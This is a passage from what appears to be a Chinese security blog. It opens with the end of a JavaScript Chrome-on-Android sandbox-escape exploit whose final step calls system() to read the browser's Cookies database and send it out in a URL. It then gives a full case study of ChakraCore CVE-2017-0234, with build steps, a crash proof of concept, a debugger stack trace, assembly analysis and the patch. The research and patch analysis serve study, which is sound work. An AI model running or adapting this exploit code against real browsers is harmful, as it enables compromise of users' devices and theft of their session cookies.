class="number">8</span>, NEGONE);</span><br><span class="line">            write32(bucket + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">                MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">                MInt(CBF_SMBITMAP),</span><br><span class="line">                MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">                MInt(guessedAddress + bucketOff + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">                MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// This is an arbitrary-ish call that allocates an unusually large</span></span><br><span class="line">        <span class="comment">// object with a vtable.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucket, bucketInBrowser;</span><br><span class="line">        <span class="keyword">var</span> socket_id = <span class="number">1000</span>;</span><br><span class="line">        outer:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> P2P_SOCKET_TCP_CLIENT = <span class="number">3</span>;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190044</span>, <span class="comment">// P2PHostMsg_CreateSocket</span></span><br><span class="line">                MInt(P2P_SOCKET_TCP_CLIENT), <span class="comment">// type</span></span><br><span class="line">                MInt(++socket_id), <span class="comment">// socket_id</span></span><br><span class="line">                <span class="comment">// local_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// port</span></span><br><span class="line">                <span class="comment">// remote_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0x80808080</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">1234</span>)); <span class="comment">// port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            call(funcs.usleep, <span class="number">20000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">                bucket = bucketStart + bucketOff;</span><br><span class="line">                <span class="keyword">if</span>(read32(bucket + <span class="number">8</span> + <span class="number">0x5c</span>) == P2P_SOCKET_TCP_CLIENT) &#123;</span><br><span class="line">                    bucketInBrowser = guessedAddress + bucketOff;</span><br><span class="line">                    <span class="keyword">break</span> outer;</span><br><span class="line">                &#125;</span><br><span class="line">                write32(bucket, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">100000</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Didn't get allocated or wrong allocation or something"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// There's probably a simpler way but... I've never actually had a</span></span><br><span class="line">        <span class="comment">// chance to use system in an exploit before :]</span></span><br><span class="line">        write32(bucket + <span class="number">8</span>, bucketInBrowser - <span class="number">4</span>);</span><br><span class="line">        <span class="comment">// don't reuse please, this will be unmapped</span></span><br><span class="line">        write32(bucket + <span class="number">4</span>, <span class="number">0x10000</span> | CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">        write32(bucket, funcs.system);</span><br><span class="line">        <span class="keyword">var</span> url = <span class="built_in">window</span>.location.origin + <span class="string">'/sb.png'</span>;</span><br><span class="line">        copystr(bucket + <span class="number">12</span>, <span class="string">'; am start --user 0 -a android.intent.action.VIEW -d "'</span> + url + <span class="string">'?`hd -c 1024 /data/data/com.android.chrome/app_chrome/Default/Cookies`" &amp; kill $PPID'</span>);</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190052</span>, <span class="comment">// P2PHostMsg_DestroySocket</span></span><br><span class="line">            MInt(socket_id));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        xerr = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok, we're done...</span></span><br><span class="line">    setNonblock(pipe_, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    call(funcs.usleep, <span class="number">100000</span>);</span><br><span class="line">    write32(myfutex, <span class="number">0</span>);</span><br><span class="line">    call(funcs.futex, myfutex, FUTEX_WAKE, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//messageSend(0xfffffffe, 0xfffe);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(xerr) &#123;</span><br><span class="line">        alert(<span class="string">'Exception: '</span> + xerr + <span class="string">'\n'</span> + xerr.stack);</span><br><span class="line">        crash();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">'?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dlsym</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    copystr(callbuf + <span class="number">0x28</span>, name);</span><br><span class="line">    <span class="keyword">var</span> result = call(dlsym_addr, <span class="number">0xffffffff</span>, callbuf + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"couldn't find "</span> + name);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    initialOverwrite();</span><br><span class="line">    launderBuffers(buffersToForce, <span class="string">'saveBuffersToForce'</span>, sniffAroundInHeap);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    alert(<span class="string">'Exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/03/cve-2017-0234-3.0/" itemprop="url">case study:cve-2017-0234</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-03T21:32:43+08:00">
                2018-07-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="vs调试环境配置"><a href="#vs调试环境配置" class="headerlink" title="vs调试环境配置"></a>vs调试环境配置</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>首先下载<a href="https://github.com/Microsoft/ChakraCore" target="_blank" rel="noopener">ChakraCore</a><br>然后<code>git clone https://github.com/Microsoft/ChakraCore.git</code><br>在ChakraCore项目中搜索CVE-2017-0234，找到patch的commit，然后得到有漏洞的版本的hash<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg" alt=""><br>然后checkout,<code>git checkout d8ef97d90c231e83db96dc4fdff4b39409f7a9b6</code><br>然后在VS2015中打开<code>Build\Chakra.Core.sln</code>，并生成解决方案<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070434.jpg" alt=""></p>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070449.jpg" alt=""><br>右键设置为启动项目<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070458.jpg" alt=""><br>在命令参数写好绝对路径并执行<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070506.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070515.jpg" alt=""></p>
<h3 id="windbg调试环境配置"><a href="#windbg调试环境配置" class="headerlink" title="windbg调试环境配置"></a>windbg调试环境配置</h3><p>在windows store下载windbg preview<br>设置符号服务器<br><code>SRV*c:\edgesymbol*http://msdl.microsoft.com/download/symbols</code><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070526.jpg" alt=""><br>直接调试chakra<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070550.jpg" alt=""><br>Windbg preview可以直接查看源码，在源码点击下断,很方便。</p>
<h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h3><p>PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step) view[i] = num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1851880825</span>);</span><br></pre></td></tr></table></figure></p>
<p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070621.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070909.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070946.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&gt;k</span><br><span class="line"> 索引     函数      </span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"> 1      0000018d9694015c()</span><br><span class="line">*2      ChakraCore.dll!Js::InterpreterStackFrame::CallLoopBody(void *(*)(Js::RecyclableObject *, Js::CallInfo) address=0x0000018d96940000)</span><br><span class="line"> 3      ChakraCore.dll!Js::InterpreterStackFrame::DoLoopBodyStart(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, const bool doProfileLoopCheck=false, bool isFirstIteration=true)</span><br><span class="line"> 4      ChakraCore.dll!Js::InterpreterStackFrame::ProfiledLoopBodyStart&lt;1,1&gt;(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, bool isFirstIteration=true)</span><br><span class="line"> 5      ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledLoopStart&lt;0,1&gt;(const unsigned char * ip=0x0000018d96828b49)</span><br><span class="line"> 6      ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 7      ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 8      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x0000019598284540, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fba, void * addressOfReturnAddress=0x0000002e3a7fe4b8, const bool isAsmJs=false)</span><br><span class="line"> 9      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fe4f0)</span><br><span class="line"> 10     [外部代码]  </span><br><span class="line"> 11     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 12     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x0000019598284540, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 13     ChakraCore.dll!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=16, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 14     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfileCallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=0, unsigned short profileId=3, unsigned int inlineCacheIndex=3, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 15     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledCallIWithICIndex&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, unsigned int flags=0)</span><br><span class="line"> 16     ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 17     ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 18     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x00000195982844e0, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fc2, void * addressOfReturnAddress=0x0000002e3a7fef48, const bool isAsmJs=false)</span><br><span class="line"> 19     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fef80)</span><br><span class="line"> 20     [外部代码]  </span><br><span class="line"> 21     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 22     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x00000195982844e0, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 23     ChakraCore.dll!Js::JavascriptFunction::CallRootFunctionInternal(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 24     ChakraCore.dll!Js::JavascriptFunction::CallRootFunction(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 25     ChakraCore.dll!RunScriptCore::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper=&#123;...&#125;)</span><br><span class="line"> 26     ChakraCore.dll!ContextAPIWrapper::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620)</span><br><span class="line"> 27     ChakraCore.dll!ContextAPIWrapper_Core&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) &gt;(ContextAPIWrapper::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext)&#123;...&#125;)</span><br><span class="line"> 28     ChakraCore.dll!ContextAPIWrapper&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) &gt;(RunScriptCore::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper)&#123;...&#125;)</span><br><span class="line"> 29     ChakraCore.dll!RunScriptCore(void * scriptSource=0x00000195982bc000, const unsigned char * script=0x0000018d967278e0, unsigned __int64 cb=266, LoadScriptFlag loadScriptFlag=LoadScriptFlag_Utf8Source | LoadScriptFlag_ExternalArrayBuffer, unsigned __int64 sourceContext=0, const wchar_t * sourceUrl=0x0000018d9682c1c0, bool parseOnly=false, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, bool isSourceModule=false, void * * result=0x0000000000000000)</span><br><span class="line"> 30     ChakraCore.dll!CompileRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000, bool parseOnly=false)</span><br><span class="line"> 31     ChakraCore.dll!JsRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 32     ch.exe!ChakraRTInterface::JsRun(void * script=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 33     ch.exe!RunScript(const char * fileName=0x0000018d9673df50, const char * fileContents=0x0000018d967278e0, void * bufferValue=0x0000000000000000, char * fullPath=0x0000002e3a7ffa70)</span><br><span class="line"> 34     ch.exe!ExecuteTest(const char * fileName=0x0000018d9673df50)</span><br><span class="line"> 35     ch.exe!ExecuteTestWithMemoryCheck(char * fileName=0x0000018d9673df50)</span><br><span class="line"> 36     ch.exe!StaticThreadProc(void * lpParam=0x0000002e3a17fba8)</span><br><span class="line"> 37     ch.exe!invoke_thread_procedure(unsigned int(*)(void *) procedure=0x00007ff7d84647d0, void * const context=0x0000002e3a17fba8)</span><br><span class="line"> 38     ch.exe!thread_start&lt;unsigned int (__cdecl*)(void * __ptr64)&gt;(void * const parameter=0x0000018d9673ea70)</span><br><span class="line"> 39     [外部代码]</span><br></pre></td></tr></table></figure></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-072024.jpg" alt=""><br>关于JIT生成不是重点，于是我调试了一下并没有详细写出调用，只是说一下。<br>在循环的解释执行次数超出loopInterpretCount的值的时候，就会进入JIT代码生成，然后在JIT代码生成后就转到JIT中执行，不再解释执行。</p>
<p>在JIT优化之后，DoLoopBodyStart调用CallLoopBody，参数是循环体JIT代码的地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071023.jpg" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fn-&gt;GetIsAsmJsFunction())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="function">AutoRestoreLoopNumbers <span class="title">autoRestore</span><span class="params">(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck)</span></span>;</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallAsmJsLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                AutoRestoreLoopNumbers autoRestore(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck);</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
<p>漏洞触发在循环体中</p>
<h4 id="分析patch前汇编"><a href="#分析patch前汇编" class="headerlink" title="分析patch前汇编"></a>分析patch前汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0000018D96940138  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">0000018D9694013E  inc         ecx  </span><br><span class="line">0000018D96940140  cmp         r9d,r10d ----&gt;检查begin是否小于end</span><br><span class="line">0000018D96940143  jge         0000018D96940181  </span><br><span class="line">0000018D96940145  mov         r11,r14  </span><br><span class="line">0000018D96940148  mov         r13,r11  </span><br><span class="line">0000018D9694014B  shr         r13,30h  </span><br><span class="line">0000018D9694014F  cmp         r13,1  </span><br><span class="line">0000018D96940153  jne         0000018D9694032F  </span><br><span class="line">0000018D96940159  mov         r13d,r11d  </span><br><span class="line">0000018D9694015C  mov         dword ptr [rsi+r9*4],r13d ----&gt;对数组元素赋值</span><br></pre></td></tr></table></figure>
<p><code>mov         dword ptr [rsi+r9*4],r13d</code>是对view数组元素赋值，rsi是buffer的首地址,r9是数组索引值i,r13d即1851880825(hex:0x6E617579)是要赋的值</p>
<p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071054.jpg" alt=""><br>由汇编可以看出，缺少对索引值的边界检查（或者说优化后只剩下了检查begin是否小于end，但是没有检查索引上界end是否超出数组内存边界）<br>于是就访问到了不能访问的地址,crash。</p>
<h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><ul>
<li>patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Too aggressive bound check removal</span><br><span class="line">Don&apos;t eliminate bounds checks on virtual typed arrays if we can&apos;t guarantee that the accesses will be within 4Gb</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">		-            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">		-            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">		+            <span class="comment">// Unless we're in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),</span></span><br><span class="line">		+            <span class="comment">// check the range of the index to make sure we won't access beyond the reserved memory beforing eliminating bounds</span></span><br><span class="line">		+            <span class="comment">// checks in jitted code.</span></span><br><span class="line">		+            <span class="keyword">if</span> (!GetIsAsmJSFunc())</span><br><span class="line">		+            &#123;</span><br><span class="line">		+                IR::RegOpnd * idxOpnd = baseOwnerIndir-&gt;GetIndexOpnd();</span><br><span class="line">		+                <span class="keyword">if</span> (idxOpnd)</span><br><span class="line">		+                &#123;</span><br><span class="line">		+                    StackSym * idxSym = idxOpnd-&gt;m_sym-&gt;IsTypeSpec() ? idxOpnd-&gt;m_sym-&gt;GetVarEquivSym(<span class="literal">nullptr</span>) : idxOpnd-&gt;m_sym;</span><br><span class="line">		+                    Value * idxValue = FindValue(idxSym);</span><br><span class="line">		+                    IntConstantBounds idxConstantBounds;</span><br><span class="line">		+                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">		+                    &#123;</span><br><span class="line">		+                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">		+                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">		+                        int32 lowerBound = idxConstantBounds.LowerBound();</span><br><span class="line">		+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">		+                        &#123;</span><br><span class="line">		+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">		+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">		+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">		+                        &#125;</span><br><span class="line">		+                    &#125;</span><br><span class="line">		+                &#125;</span><br><span class="line">		+            &#125;</span><br><span class="line">		+            <span class="keyword">else</span></span><br><span class="line">		+            &#123;</span><br><span class="line">		+                eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">		+                eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">		+                canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">		+            &#125;</span><br></pre></td></tr></table></figure>
